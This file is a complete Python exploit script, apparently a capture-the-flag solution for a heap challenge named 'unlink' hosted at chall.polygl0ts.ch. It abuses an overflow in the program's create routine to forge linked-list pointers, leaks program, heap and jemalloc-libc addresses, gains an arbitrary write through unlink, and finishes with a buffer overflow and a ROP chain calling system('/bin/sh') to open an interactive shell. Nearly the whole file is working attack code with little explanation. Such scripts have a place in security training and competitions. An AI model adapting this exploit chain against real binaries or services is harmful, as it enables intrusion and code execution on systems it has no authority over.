#!/usr/bin/env python3
from ctypes import CDLL
from subprocess import Popen, PIPE
from pwncli import *
import sys
from os import path
import traceback
# =========================================================
#                          SETUP                         
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'unlink_patched')
context.bits = 64
context.arch = 'amd64'
try: elf = context.binary = ELF(exe, checksec=False)
except: elf = type('S',(),{'address':0})()
try: libc = elf.libc
except: libc = type('S',(),{'address':0})()
libc_jemalloc = './libjemalloc.so.2'
libc_jemalloc = ELF(libc_jemalloc, checksec=False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "70"]


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
b *unlinnk
b *sign
b *sign+324
b *read+52
c
'''.format(**locals())

is_ipv4 = lambda s: len(s.split('.')) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in s.split('.'))
is_domain = lambda s: all(part.isalnum() or part == '-' for part in s.split('.'))
is_port = lambda s: s.isdigit() and 0 <= int(s) <= 65535
use_ip = lambda: len(sys.argv) >= 3 and (is_ipv4(sys.argv[1]) or is_domain(sys.argv[1])) and is_port(sys.argv[2])

def initialize(argv=[]):
    global pid
    update_checksec() 
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = process(["pgrep", "-fx", "./unlink"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        host, port = ("chall.polygl0ts.ch", 6666) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
        return remote(host, port, ssl=False)
    elif use_ip():
        context.log_level = 'info'
        host, port = str(sys.argv[1]), int(sys.argv[2])
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

def execute(cmds, verbose=False):
    cmds = cmds if isinstance(cmds, list) else cmds.split()
    if verbose:
        sys.stdout.write("\n")
        sys.stdout.flush()
        p = Popen(cmds, stdout=PIPE, stderr=sys.stdout, text=True, bufsize=1)
        buf = []
        for line in p.stdout:
            sys.stdout.write(line)   # live output (colors intact)
            sys.stdout.flush()
            buf.append(line)         # keep copy
        p.wait()
        return "".join(buf)
    else:
        p = Popen(cmds, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return out if out else err


def open_split_tmux(cmd):
    cmd = cmd.split() if isinstance(cmd, str) else cmd
    execute(["tmux", "splitw", "-h", "-p", "65"] + cmd)

def debug():
    global gdbscript, pid
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)) and not use_ip():
        if args.QEMU:
            open_split_tmux(["gdb"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe="./unlink")
        else:
            attach(io, gdbscript=gdbscript)

def update_checksec():
    marker = "CHECKSEC"
    fn = sys.modules[__name__].__file__
    with open(fn, "r+", encoding="utf-8") as f:
        src = f.read()
        i = src.find(marker)
        i = src.find(marker, i + 1)
        i = src.find("\n", i)
        i = src.find("\n", i + 1)
        start = i + 1
        end = src.find("\n", start)
        if end == -1: 
            end = len(src)
        if src[start:end].strip() == "":
            output = execute(["checksec", "--file", exe])
            commented = "".join(("# " + line + "\n") if line.strip() else "#\n" for line in output.splitlines())
            src = src[:start] + commented + src[end:]
            f.seek(0); f.write(src); f.truncate()

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
se      = lambda data               :str(data).encode()
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda num, data=None     : u32((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(4, b"\x00"))
uu64    = lambda num, data=None     : u64((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(8, b"\x00"))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))

# =========================================================
#                         CHECKSEC
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No
#     Debuginfo:  Yes

# =========================================================
#                         EXPLOITS
# =========================================================
def menu(choice: int):
    """
    Send a menu choice:
        1: create something
        2: do sometehing with the thing
    """
    # main() prints both menu lines before each choice
    # 1: create something
    # 2: do sometehing with the thing
    sla("2: do sometehing with the thing\n", se(choice))


def create(size: int, data: bytes) -> int:
    """
    Wrapper for create():

        puts("input size?");
        size = get_number();
        puts("data?");
        read(0, in, size);
        malloc(sizeof(some_thing));
        memcpy(challenge, in, strlen(in));  // vuln
        printf("new session: %d\n", session_id);
    """
    assert 0 < size <= 0x400

    # normalize data length to exactly size bytes
    # if len(data) < size:
    #     data = data.ljust(size, b"A")
    # elif len(data) > size:
    #     data = data[:size]

    menu(1)
    sla("input size?\n", se(size))
    ru("data?\n")
    s(data)  # raw send, no newline â€“ read(0, in, size) expects exact size

    # read "new session: %d\n"
    line = rl().decode(errors="ignore").strip()
    # e.g. "new session: 123456789"
    try:
        session_id = int(line.split(":")[1].strip())
    except Exception:
        log.warn(f"Unexpected session line: {line!r}")
        session_id = -1

    log.info(f"[create] size={size:#x}, session_id={session_id}")
    return session_id


def do_sign(session_id: int):
    """
    Wrapper for sign():

        puts("session id?");
        get_number();
        ... print challenge & signature ...
        unlinnk(thing); free(thing);
    """
    menu(2)
    sla("session id?\n", se(session_id))

    # Just drain the output so we don't desync
    ru("challenge: \n")
    ru("=============================\n")
    # read challenge (variable length, up to 0x100)
    # simplest: read until newline + ===== line
    challenge = ru("\n=============================\n", drop=True)

    ru("signature: \n")
    ru("=============================\n")
    sig = io.recvn(0x100)  # crypto_sign always memset(out, 0, 0x100)
    ru("\n=============================\n")

    log.info(f"[sign] got challenge len={len(challenge)}, sig len={len(sig)}")
    return challenge, sig

def write(where, what):
    global A, B, C, D
    A = create(0x120, b"A")
    B = create(0x120, b"B")
    do_sign(A)
    A = create(0x400, b"A"*0x128 + p64(where)) # overflow and overwrite B's prev
    C = create(0x120, b"C")
    do_sign(A)    
    A = create(0x400, b"A"*0x120 + p64(what)) # overflow and overwrite B's next
    do_sign(B) # trigger unlink

def ret2system():
    rop = ROP(libc)
    # rop.raw(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh')))
    return rop.chain()

def exploit(x):
    global io, A, B, C, D
    io = initialize()
    # debug()
    # Code here ...
    with log.progress("Leaking addresses"), context.silent:
        A = create(0x120, b"A"*0x120)
        B = create(0x120, b"B"*0x120)
        C = create(0x120, b"C"*0x120)
        do_sign(B)
        B = create(0x400, b"B"*0x138 + p64(0x140))  # overflow B to C's size
        do_sign(B)
        do_sign(A) # Make the C prev and next to head_next
        A = create(0x120, b"A"*0x120)
        B = create(0x120, b"B"*0x120)
        D = create(0x120, b"D")
        challenge, sign = do_sign(u64(b"B"*8))
        leaks = challenge[0x120:]
        elf_leak = u64(leaks[:0x8])
        heap_addr = u64(leaks[0x8:0x10])
        heap = heap_addr - 0x140
        crypto_heap = heap - 0x1000
        elf.address = elf_leak - elf.sym["head_next"]
        do_sign(D)
        do_sign(B)
        do_sign(A)

    leak("Leaked data", leaks)
    leak("ELF leak", hex(elf_leak))
    leak("Heap leak", hex(heap_addr))
    leak("Heap base", hex(heap))
    leak("Crypto heap", hex(crypto_heap))
    with log.progress("Leaking libc jemalloc address via crypto heap"), context.silent:
        A = create(0x120, b"A")
        B = create(0x120, b"B")
        D = create(0x120, b"D")
        C = create(0x120, b"C")
        E = create(0x120, b"E")
        F = create(0x120, b"F")
        G = create(0x120, b"G")
        H = create(0x120, b"H")
        do_sign(F)
        F = create(0x400, b"F"*0x120 + p64(crypto_heap - 0x10)) # making fake next 
        do_sign(G)
        do_sign(D)    
        D = create(0x400, b"D"*0x120 + p64(crypto_heap - 0x8)) # making fake prev
        do_sign(E)
        challenge, _ = do_sign(elf.sym["crypto_sign"]) # trigger unlink
        libc_jemalloc_leak = u64(challenge[:0x50][:8])
        libc_jemalloc.address = libc_jemalloc_leak - libc_jemalloc.sym["free"]
        libc.address = libc_jemalloc.address - 0x212000
    leak("Libc jemalloc leak", hex(libc_jemalloc_leak))
    leak("Libc jemalloc base address", hex(libc_jemalloc.address))
    with log.progress("Getting RIP via fake crypto -> bof"), context.silent:
        # thank daesong for finding this awesome gadget :)
        rip = elf.sym["create"] + 152 # read [rbp - xx] 
        do_sign(A)
        A = create(0x400, b"A"*0x120 + p64(heap + 0x3c0)) # Fix the pointer
        A = create(0x120, b"A"*8 + p64(rip))
        B = create(0x120, b"B")
        write(elf.sym["crypto"], heap + 0x510)
        offset = 992
        payload = flat({offset:[ret2system()]})
        debug()
        sleep(1)
        sl(payload) # BOF
    leak("ELF base address", hex(elf.address)) if elf.address else None
    leak("Libc base address", hex(libc.address)) if libc.address else None
    io.interactive() if not args.NOINTERACT else None

if __name__ == '__main__':
    global io
    for i in range(1):
        try:
            exploit(i)
        except Exception as e:
            sys.stderr.write(traceback.format_exc())
        io.close()